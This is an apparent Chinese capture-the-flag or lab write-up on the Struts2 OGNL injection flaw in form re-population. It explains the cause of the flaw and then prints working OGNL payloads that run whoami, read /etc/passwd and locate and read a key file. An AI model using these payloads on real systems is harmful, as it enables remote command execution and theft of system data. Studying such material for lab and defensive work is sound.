![1654826508_62a2a60c877f5621cd240.png!small](https://image.3001.net/images/20220610/1654826508_62a2a60c877f5621cd240.png!small)

该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value}
进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value}
对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行。

![1654826529_62a2a621c7c2c336f7e81.png!small](https://image.3001.net/images/20220610/1654826529_62a2a621c7c2c336f7e81.png!small)

首先在password地方输入%{1+1}返回2，证明存在漏洞：

![1654826543_62a2a62f8bbca189448ec.png!small](https://image.3001.net/images/20220610/1654826543_62a2a62f8bbca189448ec.png!small)

执行任意命令时，如果所执行的命令需要组合，则payload 为：

![1654826624_62a2a68015346b872a2c7.png!small](https://image.3001.net/images/20220610/1654826624_62a2a68015346b872a2c7.png!small)

> %{ #a=(new java.lang.ProcessBuilder(new java.lang.String[]{" **whoami**
> "})).redirectErrorStream(true).start(), #b=#a.getInputStream(), #c=new
> java.io.InputStreamReader(#b), #d=new java.io.BufferedReader(#c), #e=new
> char[50000], #d.read(#e),
> #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
> #f.getWriter().println(new java.lang.String(#e)),
> #f.getWriter().flush(),#f.getWriter().close() }

![1654826638_62a2a68e143aaef551bbd.png!small](https://image.3001.net/images/20220610/1654826638_62a2a68e143aaef551bbd.png!small)

得到返回root，猜测为linux环境，

执行以下payload，

![1654826624_62a2a68015346b872a2c7.png!small](https://image.3001.net/images/20220610/1654826624_62a2a68015346b872a2c7.png!small)

> %{ #a=(new java.lang.ProcessBuilder(new java.lang.String[]{" **cat** ","
> **/etc/passwd** "})).redirectErrorStream(true).start(),
> #b=#a.getInputStream(), #c=new java.io.InputStreamReader(#b), #d=new
> java.io.BufferedReader(#c), #e=new char[50000], #d.read(#e),
> #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
> #f.getWriter().println(new java.lang.String(#e)),
> #f.getWriter().flush(),#f.getWriter().close() }

![1654826669_62a2a6ad1d5b54762bee6.png!small](https://image.3001.net/images/20220610/1654826669_62a2a6ad1d5b54762bee6.png!small)得到/etc/passwd的返回，确定为linux环境。![1654826624_62a2a68015346b872a2c7.png!small](https://image.3001.net/images/20220610/1654826624_62a2a68015346b872a2c7.png!small)

> %{ #a=(new java.lang.ProcessBuilder(new
> java.lang.String[]{"find","/","-name","key.txt"})).redirectErrorStream(true).start(),
> #b=#a.getInputStream(), #c=new java.io.InputStreamReader(#b), #d=new
> java.io.BufferedReader(#c), #e=new char[50000], #d.read(#e),
> #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
> #f.getWriter().println(new java.lang.String(#e)),
> #f.getWriter().flush(),#f.getWriter().close() }

![1654826737_62a2a6f152fe699c469f5.png!small](https://image.3001.net/images/20220610/1654826737_62a2a6f152fe699c469f5.png!small)得到key.txt的位置为/key.txt

> %{ #a=(new java.lang.ProcessBuilder(new
> java.lang.String[]{"cat","/key.txt"})).redirectErrorStream(true).start(),
> #b=#a.getInputStream(), #c=new java.io.InputStreamReader(#b), #d=new
> java.io.BufferedReader(#c), #e=new char[50000], #d.read(#e),
> #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
> #f.getWriter().println(new java.lang.String(#e)),
> #f.getWriter().flush(),#f.getWriter().close() }

得到key.txt的内容，即key值，提交。

